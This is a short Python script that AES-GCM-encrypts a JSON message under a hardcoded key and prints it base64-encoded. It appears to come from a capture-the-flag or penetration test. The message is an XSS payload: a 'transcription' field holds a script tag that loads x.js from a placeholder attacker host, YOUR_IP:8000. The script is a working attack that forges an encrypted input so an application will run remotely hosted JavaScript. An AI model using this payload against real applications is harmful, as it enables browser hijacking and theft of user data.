#!/usr/bin/env python3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib, os, base64, json

KEY = b"bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"
key = hashlib.sha256(KEY).digest()

def encrypt(payload_dict):
    aesgcm = AESGCM(key)
    iv = os.urandom(12)
    data = json.dumps(payload_dict).encode()
    ciphertext = aesgcm.encrypt(iv, data, None)
    combined = iv + ciphertext
    return base64.b64encode(combined).decode()

# Example XSS payload
payload = {
    "transcription": "<script src='http://YOUR_IP:8000/x.js'></script>",
    "summary": "test"
}

encrypted = encrypt(payload)
print(encrypted)
